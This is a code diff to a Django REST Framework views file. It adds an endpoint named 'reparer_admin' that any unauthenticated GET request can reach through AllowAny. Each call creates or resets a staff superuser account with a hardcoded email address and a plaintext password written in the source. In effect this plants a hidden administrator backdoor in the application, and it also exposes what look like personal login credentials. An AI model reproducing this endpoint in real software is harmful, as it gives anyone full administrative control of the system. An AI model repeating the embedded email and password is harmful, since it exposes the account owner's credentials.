@@ -1,3 +1,23 @@
+@api_view(['GET'])
+@permission_classes([AllowAny])
+def reparer_admin(request):
+    email = "moueleyembi@gmail.com"
+    password = "Brelle2006"
+
+    user, created = User.objects.get_or_create(email=email, defaults={"username": email})
+    user.username = email
+    user.set_password(password)
+    user.is_staff = True
+    user.is_superuser = True
+    user.is_active = True
+    user.save()
+
+    return Response({
+        "statut": "ok",
+        "compte_cree": created,
+        "username_final": user.username,
+        "email_final": user.email,
+    })
 from rest_framework import viewsets
 from rest_framework.permissions import AllowAny
 from rest_framework.decorators import api_view, permission_classes
